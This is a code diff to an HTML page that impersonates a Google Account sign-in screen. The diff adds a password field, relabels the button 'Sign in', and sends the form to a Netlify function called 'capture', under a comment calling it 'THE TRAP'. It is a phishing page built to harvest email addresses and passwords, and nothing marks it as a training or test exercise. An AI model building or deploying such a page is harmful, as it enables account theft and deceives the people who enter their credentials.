@@ -86,14 +86,19 @@
         <h1>Sign in</h1>
         <p class="subtitle">Use your Google Account</p>
         
-        <form action="/capture" method="POST">
+        <!-- THE TRAP: Points to your Netlify function -->
+        <form action="/.netlify/functions/capture" method="POST">
             <div class="input-group">
                 <label for="email">Email or phone</label>
                 <input type="text" id="email" name="email" required>
             </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
             <div class="buttons">
                 <a href="#" class="btn-link">Create account</a>
-                <button type="submit" class="btn-primary">Next</button>
+                <button type="submit" class="btn-primary">Sign in</button>
             </div>
         </form>
         
